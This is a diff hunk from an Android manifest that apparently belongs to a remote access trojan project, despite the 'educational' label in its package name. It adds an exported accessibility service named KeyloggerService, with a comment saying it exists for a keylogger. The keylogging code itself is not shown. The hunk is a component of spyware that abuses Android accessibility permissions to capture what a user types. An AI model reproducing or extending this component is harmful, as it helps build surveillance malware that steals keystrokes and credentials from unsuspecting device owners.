@@ -97,6 +97,20 @@
             </intent-filter>
         </receiver>
 
+        <!-- Accessibility Service for Keylogger -->
+        <service
+            android:name="com.remoteaccess.educational.ultimate.rat.KeyloggerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <activity
             android:name="com.karumi.dexter.DexterActivity"
             android:theme="@style/Dexter.Internal.Theme.Transparent" />
